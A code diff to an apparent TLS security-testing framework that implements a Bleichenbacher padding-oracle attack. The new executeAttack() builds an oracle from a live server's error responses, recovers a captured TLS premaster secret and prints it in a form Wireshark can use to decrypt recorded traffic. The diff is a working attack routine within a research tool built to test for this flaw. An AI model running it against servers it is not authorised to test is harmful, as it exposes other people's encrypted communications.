@@ -12,12 +12,15 @@ import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
 import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.tlsattacker.attacks.config.BleichenbacherCommandConfig;
+import de.rub.nds.tlsattacker.attacks.pkcs1.Bleichenbacher;
 import de.rub.nds.tlsattacker.attacks.pkcs1.PKCS1VectorGenerator;
+import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
 import de.rub.nds.tlsattacker.core.config.Config;
 import de.rub.nds.tlsattacker.core.constants.AlertDescription;
 import de.rub.nds.tlsattacker.core.constants.AlertLevel;
 import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
 import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
+import de.rub.nds.tlsattacker.core.exceptions.ConfigurationException;
 import de.rub.nds.tlsattacker.core.protocol.message.AlertMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.RSAClientKeyExchangeMessage;
@@ -29,7 +32,9 @@ import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
 import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
+import java.math.BigInteger;
 import java.security.interfaces.RSAPublicKey;
+import java.util.Arrays;
 import java.util.HashSet;
 import java.util.LinkedList;
 import java.util.List;
@@ -40,8 +45,6 @@ import org.apache.logging.log4j.Logger;
  * Sends differently formatted PKCS#1 messages to the TLS server and observes
  * the server responses. In case there are differences in the server responses,
  * it is very likely that it is possible to execute Bleichenbacher attacks.
- *
- * @author Juraj Somorovsky <juraj.somorovsky@rub.de>
  */
 public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig> {
 
@@ -53,14 +56,56 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
 
     @Override
     public void executeAttack() {
-        throw new UnsupportedOperationException("Not implemented yet");
+        if (config.getInvalidResponseContent() == null && config.getValidResponseContent() == null) {
+            throw new ConfigurationException("You have to set a string contained in the last "
+                    + "protocol message sent by the server which will indicate whether the PKCS#1 "
+                    + "message was valid or not. For example, you can set the following parameter: "
+                    + "-invalid_response BAD_RECORD_MAC");
+        }
+        RSAPublicKey publicKey;
+        Config tlsConfig = config.createConfig();
+        publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
+        if (publicKey == null) {
+            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
+            return;
+        }
+        LOGGER.info("Fetched the following server public key: " + publicKey);
+
+        if (config.getEncryptedPremasterSecret() == null) {
+            throw new ConfigurationException("You have to set the encrypted premaster secret you are "
+                    + "going to decrypt");
+        }
+
+        byte[] pms = ArrayConverter.hexStringToByteArray(config.getEncryptedPremasterSecret());
+        if ((pms.length * 8) != publicKey.getModulus().bitLength()) {
+            throw new ConfigurationException("The length of the encrypted premaster secret you have "
+                    + "is not equal to the server public key length. Have you selected the correct value?");
+        }
+
+        RealDirectMessagePkcs1Oracle oracle = new RealDirectMessagePkcs1Oracle(publicKey, tlsConfig,
+                config.getValidResponseContent(), config.getInvalidResponseContent());
+
+        Bleichenbacher attacker = new Bleichenbacher(pms, oracle, config.isMsgPkcsConform());
+        attacker.attack();
+        BigInteger solution = attacker.getSolution();
+
+        LOGGER.info("Final solution: {}", solution.toString(16));
+
+        byte[] pmsResult = solution.toByteArray();
+        pmsResult = Arrays.copyOfRange(pmsResult, pmsResult.length - 46, pmsResult.length);
+        String pmsResultString = ArrayConverter.bytesToHexString(pmsResult, false).replace(" ", "");
+
+        LOGGER.info("If you have a TLS wireshark trace, you can decrypt it as follows. "
+                + "Create a file with the following content and use it as an input into "
+                + "wireshark:\n  CLIENT_RANDOM <client random> {}", pmsResultString);
+
     }
 
     private ProtocolMessage executeTlsFlow(byte[] encryptedPMS) {
         // we are initializing a new connection in every loop step, since most
         // of the known servers close the connection after an invalid handshake
         State state = new State(config.createConfig());
-        state.getConfig().setWorkflowTraceType(WorkflowTraceType.FULL);
+        state.getConfig().setWorkflowTraceType(WorkflowTraceType.HANDSHAKE);
         WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(state.getConfig()
                 .getWorkflowExecutorType(), state);
         WorkflowTrace trace = state.getWorkflowTrace();
